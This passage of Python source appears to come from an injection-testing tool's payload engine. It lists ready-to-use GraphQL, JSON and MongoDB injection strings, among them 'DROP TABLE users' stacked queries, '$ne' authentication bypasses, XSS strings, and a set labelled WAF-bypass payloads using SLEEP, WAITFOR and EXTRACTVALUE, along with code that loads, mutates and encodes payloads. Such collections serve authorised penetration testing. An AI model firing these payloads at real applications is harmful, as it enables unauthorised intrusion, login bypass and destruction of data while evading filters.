        ]
        return payloads

    def _get_graphql_payloads(self) -> List[Payload]:
        """Get GraphQL injection payloads (2026 modern)."""
        payloads = [
            Payload(value='" UNION SELECT NULL--', payload_type=PayloadType.GRAPHQL, category="graphql_string", description="GraphQL string injection", expected_behavior="Different response with UNION", risk_level="high"),
            Payload(value='\\" OR 1=1--', payload_type=PayloadType.GRAPHQL, category="graphql_escape", description="GraphQL escaped quote injection", expected_behavior="Bypass GraphQL parsing", risk_level="high"),
            Payload(value='1; DROP TABLE users--', payload_type=PayloadType.GRAPHQL, category="graphql_stacked", description="GraphQL stacked query", expected_behavior="Stacked query execution", risk_level="high"),
            Payload(value='{"a": "1\' OR \'1\'=\'1"}', payload_type=PayloadType.GRAPHQL, category="graphql_json", description="GraphQL JSON parameter injection", expected_behavior="JSON injection in query variables", risk_level="high"),
            # Additional GraphQL payloads (NEW)
            Payload(value='{a: __typename}', payload_type=PayloadType.GRAPHQL, category="graphql_introspection", description="GraphQL introspection", expected_behavior="Schema exposure", risk_level="medium"),
            Payload(value='1" onerror="alert(1)', payload_type=PayloadType.GRAPHQL, category="graphql_xss", description="GraphQL XSS", expected_behavior="XSS via GraphQL", risk_level="high"),
            Payload(value='\n  {a:b}\n', payload_type=PayloadType.GRAPHQL, category="graphql_newline", description="GraphQL newline", expected_behavior="Bypass validation", risk_level="medium"),
            Payload(value='{"variables": {"id": "1 OR 1=1"}}', payload_type=PayloadType.GRAPHQL, category="graphql_var", description="GraphQL variables", expected_behavior="SQL in variables", risk_level="high"),
            Payload(value='id: 1 OR 1=1', payload_type=PayloadType.GRAPHQL, category="graphql_direct", description="GraphQL direct", expected_behavior="SQL in query", risk_level="high"),
            Payload(value='null--', payload_type=PayloadType.GRAPHQL, category="graphql_comment", description="GraphQL comment", expected_behavior="Comment injection", risk_level="medium"),
            Payload(value='" OR "1"="1', payload_type=PayloadType.GRAPHQL, category="graphql_or", description="GraphQL OR", expected_behavior="Boolean injection", risk_level="high"),
            Payload(value='""" UNION SELECT NULL--', payload_type=PayloadType.GRAPHQL, category="graphql_triple", description="GraphQL triple quote", expected_behavior="Different response", risk_level="high"),
        ]
        return payloads

    def _get_json_payloads(self) -> List[Payload]:
        """Get JSON API injection payloads."""
        payloads = [
            Payload(value='{"id": "1 OR 1=1"}', payload_type=PayloadType.JSON, category="json_string", description="JSON string injection", expected_behavior="SQL in JSON value", risk_level="high"),
            Payload(value='{"id": "1\' OR \'1\'=\'1"}', payload_type=PayloadType.JSON, category="json_boolean", description="JSON boolean injection", expected_behavior="Boolean injection via JSON", risk_level="high"),
            Payload(value='{"id": "1\"; DROP TABLE users; --"}', payload_type=PayloadType.JSON, category="json_stacked", description="JSON stacked injection", expected_behavior="Stacked query in JSON", risk_level="high"),
            # Additional JSON payloads (NEW)
            Payload(value='{"id": "1\' AND 1=1--"}', payload_type=PayloadType.JSON, category="json_and", description="JSON AND", expected_behavior="SQL injection", risk_level="high"),
            Payload(value='{"page": "1 UNION SELECT NULL--"}', payload_type=PayloadType.JSON, category="json_union", description="JSON UNION", expected_behavior="UNION injection", risk_level="high"),
            Payload(value='{"search": "admin\'--"}', payload_type=PayloadType.JSON, category="json_admin", description="JSON admin", expected_behavior="Auth bypass", risk_level="high"),
            Payload(value='{"id": 1 OR 1=1}', payload_type=PayloadType.JSON, category="json_numeric", description="JSON numeric OR", expected_behavior="SQL injection", risk_level="high"),
            Payload(value='{"filter": {"$where": "1=1"}}', payload_type=PayloadType.JSON, category="json_where", description="JSON $where", expected_behavior="JS injection", risk_level="high"),
            Payload(value='{"username": {"$ne": ""}, "password": {"$ne": ""}}', payload_type=PayloadType.JSON, category="json_nosql", description="JSON NoSQL", expected_behavior="NoSQL injection", risk_level="high"),
            Payload(value='{"id": "' + chr(39) + ' OR ' + chr(39) + '1' + chr(39) + '=' + chr(39) + '1}', payload_type=PayloadType.JSON, category="json_char", description="JSON CHAR", expected_behavior="SQL injection", risk_level="high"),
            Payload(value='{"q": "test\"}]); alert(1); //"}', payload_type=PayloadType.JSON, category="json_xss", description="JSON XSS", expected_behavior="XSS injection", risk_level="high"),
            Payload(value='{"data": ["1\' OR \'1\'=\'1"]}', payload_type=PayloadType.JSON, category="json_array", description="JSON array", expected_behavior="SQL injection", risk_level="high"),
        ]
        return payloads

    def _get_nosql_payloads(self) -> List[Payload]:
        """Get NoSQL injection payloads (MongoDB, etc)."""
        payloads = [
            Payload(value='{"$ne": null}', payload_type=PayloadType.NOSQL, category="nosql_ne", description="MongoDB $ne operator", expected_behavior="Bypass authentication", risk_level="high"),
            Payload(value='{"$gt": ""}', payload_type=PayloadType.NOSQL, category="nosql_gt", description="MongoDB $gt operator", expected_behavior="True condition", risk_level="high"),
            Payload(value='{"$where": "this.password.length > 0"}', payload_type=PayloadType.NOSQL, category="nosql_where", description="MongoDB $where injection", expected_behavior="JavaScript injection", risk_level="high"),
            Payload(value='{"$regex": "^a"}', payload_type=PayloadType.NOSQL, category="nosql_regex", description="MongoDB regex injection", expected_behavior="Pattern matching", risk_level="high"),
            Payload(value={"$gt": 0, "$username": {"$ne": ""}}, payload_type=PayloadType.NOSQL, category="nosql_auth_bypass", description="NoSQL auth bypass", expected_behavior="Bypass login", risk_level="high", database_target="mongodb"),
            # Additional NoSQL payloads (NEW)
            Payload(value='{"$exists": true}', payload_type=PayloadType.NOSQL, category="nosql_exists", description="MongoDB $exists", expected_behavior="Field exists check", risk_level="high"),
            Payload(value='{"$in": [0, 1]}', payload_type=PayloadType.NOSQL, category="nosql_in", description="MongoDB $in operator", expected_behavior="IN condition", risk_level="high"),
            Payload(value='{"$nin": [1]}', payload_type=PayloadType.NOSQL, category="nosql_nin", description="MongoDB $nin operator", expected_behavior="NOT IN condition", risk_level="high"),
            Payload(value='{"$or": [{"a": "1"}, {"b": "1"}]}', payload_type=PayloadType.NOSQL, category="nosql_or", description="MongoDB $or operator", expected_behavior="OR condition", risk_level="high"),
            Payload(value='{"$and": [{"a": "1"}, {"b": "1"}]}', payload_type=PayloadType.NOSQL, category="nosql_and", description="MongoDB $and operator", expected_behavior="AND condition", risk_level="high"),
            Payload(value='{"$not": {"$regex": "^a"}}', payload_type=PayloadType.NOSQL, category="nosql_not", description="MongoDB $not operator", expected_behavior="NOT condition", risk_level="high"),
            Payload(value='{"$type": 2}', payload_type=PayloadType.NOSQL, category="nosql_type", description="MongoDB $type", expected_behavior="Type check", risk_level="medium"),
            Payload(value='{"$size": 1}', payload_type=PayloadType.NOSQL, category="nosql_size", description="MongoDB $size", expected_behavior="Array size check", risk_level="medium"),
            Payload(value='{"$all": ["a", "b"]}', payload_type=PayloadType.NOSQL, category="nosql_all", description="MongoDB $all", expected_behavior="Array contains all", risk_level="medium"),
            Payload(value='1; sleep(5)', payload_type=PayloadType.NOSQL, category="nosql_sleep", description="MongoDB sleep", expected_behavior="Response delay", risk_level="high"),
            Payload(value='{"$expr": {"$gt": ["$a", "$b"]}}', payload_type=PayloadType.NOSQL, category="nosql_expr", description="MongoDB $expr", expected_behavior="Expression evaluation", risk_level="high"),
        ]
        return payloads
    
    def get_payloads_by_type(self, payload_type: PayloadType) -> List[Payload]:
        """Get all payloads of a specific type."""
        return self._payloads.get(payload_type, [])
    
    def set_custom_payloads(self, payloads: List[str]) -> None:
        """Set custom payloads from a list of strings."""
        self._custom_payloads = [
            Payload(
                value=p,
                payload_type=PayloadType.BOOLEAN_BASED,
                category="custom",
                description="Custom payload",
                expected_behavior="Testing with custom payload"
            )
            for p in payloads if p.strip()
        ]
    
    def load_payloads_from_file(self, filepath: str) -> int:
        """Load custom payloads from a file (one per line)."""
        try:
            with open(filepath, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            self.set_custom_payloads(payloads)
            return len(payloads)
        except Exception:
            return 0
    
    def get_all_payloads(self) -> List[Payload]:
        """Get all available payloads."""
        all_payloads = []
        for payloads in self._payloads.values():
            all_payloads.extend(payloads)
        all_payloads.extend(self._custom_payloads)
        return all_payloads[:self.max_payloads]
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        context_map = {
            'numeric': [p for p in self.get_all_payloads() if not p.value.startswith("'")],
            'string': [p for p in self.get_all_payloads() if p.value.startswith("'")],
            'json': self.get_all_payloads(),
            'cookie': self.get_all_payloads(),
            'header': self.get_all_payloads(),
        }
        return context_map.get(context, self.get_all_payloads())
    
    def add_custom_payload(self, payload: Payload) -> None:
        """Add a custom payload to the engine."""
        self._custom_payloads.append(payload)
    
    def generate_mutated_payloads(
        self,
        base_payload: Payload,
        mutation_types: List[str],
        encoding: EncodingType = EncodingType.NONE
    ) -> List[Payload]:
        """Generate mutated versions of a payload."""
        mutated = []
        
        for mutation_type in mutation_types:
            mutated_value = base_payload.mutate(mutation_type)
            encoded_value = base_payload.encode(encoding)
            
            mutated.append(Payload(
                value=mutated_value,
                payload_type=base_payload.payload_type,
                category=f"{base_payload.category}_{mutation_type}",
                description=f"Mutated: {mutation_type}",
                expected_behavior=base_payload.expected_behavior,
                risk_level=base_payload.risk_level,
                database_target=base_payload.database_target,
            ))
            
            if encoded_value != base_payload.value:
                mutated.append(Payload(
                    value=encoded_value,
                    payload_type=base_payload.payload_type,
                    category=f"{base_payload.category}_encoded",
                    description=f"Encoded: {encoding.value}",
                    expected_behavior=base_payload.expected_behavior,
                    risk_level=base_payload.risk_level,
                    database_target=base_payload.database_target,
                ))
        
        return mutated
    
    def generate_ai_payloads(
        self,
        base_patterns: List[str],
        target_db: str = "auto"
    ) -> List[Payload]:
        """Generate AI-powered payloads based on learned patterns."""
        ai_payloads = []
        
        waf_bypass_patterns = [
            ("' OR 1=1--", "waf_bypass_comment"),
            ("'/**/OR/**/1=1--", "waf_bypass_inline"),
            ("' OR 1=1#", "waf_bypass_mysql"),
            ("' OR 1=1 --%09", "waf_bypass_tab"),
            ("' OR 1=1 --%0a", "waf_bypass_newline"),
            ("' OR 1=1/*!UNION*/", "waf_bypass_mysql_comment"),
            ("' OR '1'='1'/**/AND/**/'1'='1", "waf_bypass_spaced"),
            ("' OR 1=1-- -", "waf_bypass_trailing"),
            ("1' ORDER BY 1--", "waf_bypass_orderby"),
            ("1' ORDER BY 2--", "waf_bypass_orderby2"),
            ("1' ORDER BY 3--", "waf_bypass_orderby3"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "waf_bypass_xpath"),
            ("' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "waf_bypass_updatexml"),
            ("'; WAITFOR DELAY '0:0:2'--", "waf_bypass_time_mssql"),
            ("' AND SLEEP(2)--", "waf_bypass_time_mysql"),
            ("1 AND SLEEP(2)", "waf_bypass_time_numeric"),
            ("1' AND SLEEP(2)--", "waf_bypass_time_quote"),
            ("') AND SLEEP(2)--", "waf_bypass_time_paren"),
            ("/*!50000SLEEP(2)*/", "waf_bypass_time_version"),
            ("1' AND 1=CONCAT('a', SLEEP(2))--", "waf_bypass_time_concat"),
        ]
        
        for pattern, category in waf_bypass_patterns:
            ai_payloads.append(Payload(
                value=pattern,
                payload_type=PayloadType.BOOLEAN_BASED,
                category=category,
                description=f"AI-generated WAF bypass payload (2026)",
                expected_behavior="Bypass WAF detection filters",
                risk_level="high",
                database_target=target_db if target_db != "auto" else None
            ))
        
        return ai_payloads
    
    def get_adaptive_payloads(
        self,
        response_patterns: Dict[str, Any] = None,
        previous_success: List[str] = None
    ) -> List[Payload]:
        """Get adaptive payloads based on previous responses."""
        return []